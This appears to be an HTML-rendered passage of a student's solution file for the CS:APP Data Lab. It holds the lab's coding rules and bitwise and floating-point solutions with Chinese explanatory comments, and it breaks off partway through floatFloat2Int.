class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * CS:APP Data Lab </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Please put your name and userid here&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * bits.c - Source file with your solutions to the Lab.</span></span><br><span class="line"><span class="comment"> *          This is the file you will hand in to your instructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc</span></span><br><span class="line"><span class="comment"> * compiler. You can still use printf for debugging without including</span></span><br><span class="line"><span class="comment"> * &lt;stdio.h&gt;, although you might get a compiler warning. In general,</span></span><br><span class="line"><span class="comment"> * it's not good practice to ignore compiler warnings, but in this</span></span><br><span class="line"><span class="comment"> * case it's OK.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Instructions to Students:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STEP 1: Read the following instructions carefully.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">You will provide your solution to the Data Lab by</span><br><span class="line">editing the collection of functions in this source file.</span><br><span class="line"></span><br><span class="line">INTEGER CODING RULES:</span><br><span class="line"> </span><br><span class="line">  Replace the <span class="string">"return"</span> statement in each function with one</span><br><span class="line">  or more lines of C code that implements the function. Your code </span><br><span class="line">  must conform to the following style:</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> <span class="title function_">Funct</span><span class="params">(arg1, arg2, ...)</span> {</span><br><span class="line">      <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">      <span class="type">int</span> var1 = Expr1;</span><br><span class="line">      ...</span><br><span class="line">      <span class="type">int</span> varM = ExprM;</span><br><span class="line"></span><br><span class="line">      varJ = ExprJ;</span><br><span class="line">      ...</span><br><span class="line">      varN = ExprN;</span><br><span class="line">      <span class="keyword">return</span> ExprR;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  Each <span class="string">"Expr"</span> is an expression using ONLY the following:</span><br><span class="line">  <span class="number">1.</span> Integer constants <span class="number">0</span> through <span class="number">255</span> (<span class="number">0xFF</span>), inclusive. You are</span><br><span class="line">      not allowed to use big constants such as <span class="number">0xffffffff</span>.</span><br><span class="line">  <span class="number">2.</span> Function arguments and local <span class="title function_">variables</span> <span class="params">(no global variables)</span>.</span><br><span class="line">  3. Unary integer operations ! ~</span><br><span class="line">  4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line">    </span><br><span class="line">  Some of the problems <span class="keyword">restrict</span> the <span class="built_in">set</span> of allowed operators even further.</span><br><span class="line">  Each "Expr" may consist of multiple operators. You are not restricted to</span><br><span class="line">  one operator per line.</span><br><span class="line"></span><br><span class="line">  You are expressly forbidden to:</span><br><span class="line">  1. Use any control constructs such as <span class="keyword">if</span>, <span class="keyword">do</span>, <span class="keyword">while</span>, <span class="keyword">for</span>, <span class="keyword">switch</span>, etc.</span><br><span class="line">  2. Define or use any macros.</span><br><span class="line">  3. Define any additional functions in this file.</span><br><span class="line">  4. Call any functions.</span><br><span class="line">  5. Use any other operations, such as &amp;&amp;, ||, -, or ?:</span><br><span class="line">  6. Use any form of casting.</span><br><span class="line">  7. Use any data type other than <span class="type">int</span>.  This implies that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  You may assume that your machine:</span><br><span class="line">  1. Uses 2s complement, 32-bit representations of integers.</span><br><span class="line">  2. Performs right shifts arithmetically.</span><br><span class="line">  3. Has unpredictable behavior when shifting <span class="keyword">if</span> the shift amount</span><br><span class="line">     is less than 0 or greater than 31.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXAMPLES OF ACCEPTABLE CODING STYLE:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus1</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; x) + <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus4</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="type">int</span> result = (<span class="number">1</span> &lt;&lt; x);</span><br><span class="line">     result += <span class="number">4</span>;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">FLOATING POINT CODING RULES</span><br><span class="line"></span><br><span class="line">For the problems that require you to implement floating-point operations,</span><br><span class="line">the coding rules are less strict.  You are allowed to use looping and</span><br><span class="line">conditional control.  You are allowed to use both ints and unsigneds.</span><br><span class="line">You can use arbitrary integer and <span class="type">unsigned</span> constants. You can use any arithmetic,</span><br><span class="line">logical, or comparison operations on <span class="type">int</span> or <span class="type">unsigned</span> data.</span><br><span class="line"></span><br><span class="line">You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Define or use any macros.</span><br><span class="line">  <span class="number">2.</span> Define any additional functions in this file.</span><br><span class="line">  <span class="number">3.</span> Call any functions.</span><br><span class="line">  <span class="number">4.</span> Use any form of casting.</span><br><span class="line">  <span class="number">5.</span> Use any data type other than <span class="type">int</span> or <span class="type">unsigned</span>.  This means that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line">  <span class="number">6.</span> Use any floating point data types, operations, or constants.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">  <span class="number">1.</span> Use the <span class="title function_">dlc</span> <span class="params">(data lab checker)</span> <span class="title function_">compiler</span> <span class="params">(described in the handout)</span> to </span><br><span class="line">     check the legality of your solutions.</span><br><span class="line">  2. Each function has a maximum number of <span class="title function_">operations</span> <span class="params">(integer, logical,</span></span><br><span class="line"><span class="params">     or comparison)</span> that you are allowed to use <span class="keyword">for</span> your implementation</span><br><span class="line">     of the function.  The max operator count is checked by dlc.</span><br><span class="line">     Note that <span class="title function_">assignment</span> <span class="params">(<span class="string">'='</span>)</span> is not counted; you may use as many of</span><br><span class="line">     these as you want without penalty.</span><br><span class="line">  <span class="number">3.</span> Use the btest test harness to check your functions <span class="keyword">for</span> correctness.</span><br><span class="line">  <span class="number">4.</span> Use the BDD checker to formally verify your functions</span><br><span class="line">  <span class="number">5.</span> The maximum number of ops <span class="keyword">for</span> each function is given in the</span><br><span class="line">     header comment <span class="keyword">for</span> each function. If there are any inconsistencies </span><br><span class="line">     between the maximum ops in the writeup and in this file, consider</span><br><span class="line">     this file the authoritative source.</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * STEP 2: Modify the following functions according the coding rules.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   IMPORTANT. TO AVOID GRADING SURPRISES:</span></span><br><span class="line"><span class="comment"> *   1. Use the dlc compiler to check that your solutions conform</span></span><br><span class="line"><span class="comment"> *      to the coding rules.</span></span><br><span class="line"><span class="comment"> *   2. Use the BDD checker to formally verify that your solutions produce </span></span><br><span class="line"><span class="comment"> *      the correct answers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">  <span class="comment">//数字逻辑异或的与非转换</span></span><br><span class="line">  <span class="keyword">return</span> ~((~((~x)&amp;y))&amp;(~(x&amp;(~y))));</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">   <span class="comment">//最小的数是仅有最高有效位为1的数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//返回真值,关键在于将满足条件的数(即最大数)唯一地处理成0</span></span><br><span class="line">  <span class="comment">//利用xor比较是否相等</span></span><br><span class="line">  <span class="comment">//最大数+1和取反相同:!((~x)^(x+1));  但是-1同样有这一性质,要扣掉</span></span><br><span class="line">  <span class="comment">//利用!将数值转换为布尔值,再结合&amp;实现&amp;&amp;的功能</span></span><br><span class="line">  <span class="comment">//如果有移位操作:!((~x)^(1&lt;&lt;31))</span></span><br><span class="line">  <span class="type">int</span> x_plus_1 = x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (!((~x) ^ (x_plus_1)))&amp;(!!(x_plus_1));</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//类似掩码吧</span></span><br><span class="line">  <span class="type">int</span> all = <span class="number">0xAA</span>+(<span class="number">0xAA</span>&lt;&lt;<span class="number">8</span>)+(<span class="number">0xAA</span>&lt;&lt;<span class="number">16</span>)+(<span class="number">0xAA</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line">  <span class="keyword">return</span> !((x&amp;all)^all);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//负数补码:绝对值取反+1</span></span><br><span class="line">  <span class="comment">//反过来正数求相反数:-1再取反</span></span><br><span class="line">  <span class="comment">//不过~(x-1)==(~x)+1</span></span><br><span class="line">  <span class="keyword">return</span> (~x)+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//该范围的有效位位:110000-111001</span></span><br><span class="line">  <span class="comment">//前两位及更高位固定不变,单独异或验证</span></span><br><span class="line">  <span class="comment">//末4位采用4位溢出的方式验证</span></span><br><span class="line">  <span class="type">int</span> bool1 = (x&gt;&gt;<span class="number">4</span>)^<span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> last_byte = x&amp;<span class="number">15</span>;</span><br><span class="line">  <span class="type">int</span> bool2 = (last_byte+<span class="number">6</span>)&amp;<span class="number">16</span>;</span><br><span class="line">  <span class="keyword">return</span> !bool1&amp;!bool2;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> {</span><br><span class="line">  <span class="comment">//将x转换成0和-1,与x,y进行&amp;.(1会清空高位,选用-1保留所有位)</span></span><br><span class="line">  <span class="comment">//从flag1-&gt;flag2: 0异或任何数等于任何数,-1异或-1为0.实现0和-1的转化</span></span><br><span class="line">    <span class="type">int</span> flag1 = (~!!x) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> flag2 = flag1 ^ (~<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> (flag1 &amp; y) | (flag2 &amp; z);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">  <span class="comment">//若不考虑溢出,则检测x-y的符号位</span></span><br><span class="line">  <span class="comment">//考虑溢出,因为溢出仅在x负y正和x正y负的情况下出现,而这两种情况又可直接比较大小,单独设置flag判断</span></span><br><span class="line">  <span class="type">int</span> mask = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> var1 = !(x&amp;mask);</span><br><span class="line">  <span class="type">int</span> var2 = !(y&amp;mask);</span><br><span class="line">  <span class="type">int</span> flag1 = !var1&amp;var2;</span><br><span class="line">  <span class="type">int</span> flag2 = !var2&amp;var1;</span><br><span class="line">  <span class="type">int</span> x_sub_y = x+(~y)+<span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> negate_SF = !((mask)&amp;x_sub_y);</span><br><span class="line">  <span class="comment">//感觉应该能化简..</span></span><br><span class="line">  <span class="keyword">return</span> (!negate_SF|!x_sub_y|flag1)&amp;!flag2;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//4</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">// (-x|x),若不为零,该值符号位必为1.</span></span><br><span class="line">    <span class="keyword">return</span> (~((((~x)+<span class="number">1</span>)|x)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>)^<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//二分法,若为负找最高0,若为正找最高1</span></span><br><span class="line">    <span class="type">int</span> flag, cnt_16, cnt_8, cnt_4, cnt_2, cnt_1, cnt_0;</span><br><span class="line">    <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    x = (sign &amp; (~x)) | (~sign &amp; (x));</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    cnt_16 = flag &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    x &gt;&gt;= (cnt_16);</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cnt_8 = flag &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    x &gt;&gt;= (cnt_8);</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    cnt_4 = flag &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    x &gt;&gt;= cnt_4;</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    cnt_2 = flag &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    x &gt;&gt;= cnt_2;</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    cnt_1 = flag;</span><br><span class="line">    x &gt;&gt;= cnt_1;</span><br><span class="line">    cnt_0 = x;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + cnt_0 + cnt_1 + cnt_2 + cnt_4 + cnt_8 + cnt_16;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span><br><span class="line">{</span><br><span class="line">  <span class="comment">//分别处理三部分,*2就是exp+1;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &lt;&lt; <span class="number">1</span> &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    <span class="type">unsigned</span> frac = uf &lt;&lt; <span class="number">9</span> &gt;&gt; <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> mask = uf &gt;&gt; <span class="number">31</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">255</span> &amp;&amp; frac)</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt;= <span class="number">254</span>)</span><br><span class="line">        <span class="keyword">return</span> mask| <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> mask | uf &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">exp</span>++;</span><br><span class="line">    <span class="keyword">return</span> mask|(<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|frac;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> {</span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="type">int</span> sign = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;</span><br><span class="line">    <span class="type">int</span> shiftBits = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 0比较特殊，先判断0(正负0都算作0)</span></span><br><span class="line">    <span class="keyword">if</span> (!(uf &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 判断是否为NaN还是无穷大</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="comment">// 指数减去偏移量，获取到真正的指数</span></span><br><span class="line">    <span class="built_in">exp</span> -= <span class="number">127</span>;</span><br><span class="line">    <span class="comment">// 需要注意的是，原来的frac一旦向左移位，其值就一定会小于1，所以返回0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 获取M，注意exp等于-127和不等于-127的情况是不一样的。当exp != -127时还有一个隐藏的1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> != <span class="number">-127</span>)</span><br><span class="line">        frac |= (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    <span class="comment">// 要移位的位数。注意float的小数点是点在第23位与第22位之间</span></span><br><span class="line">    shiftBits = <span class="number">23</span> - <span class="built_in">exp</span>;</span><br><span class="line">    <span class="comment">// 